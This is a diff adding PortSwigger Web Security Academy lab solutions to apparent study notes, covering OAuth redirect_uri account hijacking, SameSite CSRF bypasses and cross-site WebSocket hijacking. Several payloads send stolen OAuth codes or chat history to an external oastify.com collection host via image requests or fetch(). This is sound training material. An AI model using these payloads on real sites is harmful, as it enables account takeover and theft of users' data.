@@ -350,6 +350,20 @@ Implement and properly handle state (`nonce`) during OAuth `authorization reques
 
 ### Lab: OAuth account hijacking via redirect_uri
 
+Solution:
+
+1. Prepare the content of exploit server:
+
+
+    <img src="https://oauth-0ac200710489f4088294a907025b0040.oauth-server.net/auth?client_id=ocyb4qnsgvstf8de8e07i&redirect_uri=https://xbcl3q90bijx8paegc08b6i6yx4osig7.oastify.com&response_type=code&scope=openid%20profile%20email">
+
+2. Notice the OAuth2 code sent to Collaborator
+
+3. Log in as admin:
+
+    https://0a6200db0411f49482bdab9d00270000.web-security-academy.net/oauth-callback?code=O7aYu_i8eMVV6CcCQwb0-SDTRLPQ273XIKCmYiTgvrs
+```
+
 ## XML external entity (XXE) injection
 
 ### Lab: Exploiting XXE using external entities to retrieve files
@@ -582,7 +596,57 @@ url -d -s --cookie "session=vYm5cgNQ2E0iquIlRGbLN8FHHRCK4aJg;csrfKey=5wJWeNz38ZY
 </html>
 ```
 
-**Mitigation**
+### Lab: SameSite Lax bypass via method override
+
+    https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
+
+Solution:
+
+```
+<script>
+document.location="https://0a6f005e035ef74580ed03a600160080.web-security-academy.net/my-account/change-email?email=abc%40xyz.com&_method=POST"
+</script>
+```
+
+### Lab: SameSite Strict bypass via client-side redirect
+
+    https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
+
+Solution:
+
+```
+<script>
+document.location='https://0a07006203f1203f80b13fc900540009.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=cba%40xyz.com%26submit=1'
+</script>
+```
+
+### Lab: SameSite Strict bypass via sibling domain
+
+    https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
+
+Detecting vunerability:
+
+1. Launching CSRF attack when session cookie was set as `SameSite=Strict` seems hard at first look especially if we're up not only to forge the request in context of the victim, but also extract his chat history.
+2. After closer inspection we discover that:
+ - websocket is used and WS handshake is not secured againist CSRFs in any additional means (only via `SameSite=Strict` as all other requests)
+ - server leaks via `Access-Control-Allow-Origin`, `https://cms-0ade00e504db0f6c81bbe3e40093003e.web-security-academy.net` subdomain. Which in context of SameSite protection is on the same site :)
+ - there is reflected XSS at `https://cms-0ade00e504db0f6c81bbe3e40093003e.web-security-academy.net`
+
+Exploitation:
+
+1. Launch WS handshake CSRF on a victim via reflected XSS at `https://cms-0ade00e504db0f6c81bbe3e40093003e.web-security-academy.net`:
+
+```
+<form action="https://cms-0ade00e504db0f6c81bbe3e40093003e.web-security-academy.net/login" method="POST">
+<input type="hidden" name="username" value="<script>var ws = new WebSocket('wss://0ade00e504db0f6c81bbe3e40093003e.web-security-academy.net/chat');ws.onopen = function() {ws.send('READY');};ws.onmessage = function(event) {fetch('https://8enw61cbetm8b0dpjn3jehlh187zvsjh.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});};</script>" />
+<input type="hidden" name="password" value="abc" />
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+### Lab: SameSite Lax bypass via cookie refresh
+
+    https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
 
 
 ### Lab: CSRF where Referer validation depends on header being present
@@ -1524,6 +1588,32 @@ Payload: `<img src=1 onerror='alert(1)'/>`
 Solution (3rd party tool used: https://github.com/vi/websocat):
 
     echo -n "{\"message\":\"<img src=1 onerror='alert(1)'/>\"}" | websocat --text -v - wss://acc21f591f207752c010be23002b006e.web-security-academy.net/chat
+
+### Lab: Cross-site WebSocket hijacking
+
+This is basically CSRF over websocket connection. Victim is tricked to visit malicious website which performs websocket handshake on behalf of the victim and then gets access to victim's data (chat history).
+
+Solution:
+
+```
+<script>
+    var ws = new WebSocket('wss://0a980078030a90998cafb73000ca00c4.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://m2pxjb5rp8flu7rxbrz3226he8kz8pwe.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+
+Mitigation:
+
+As with standard CSRF, anit CSRF tokens needs to be used to prevent an attacker from forging websocket handshake on behalf of the victim.
+
+### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
+
+    https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
 
 ## Authentication
 
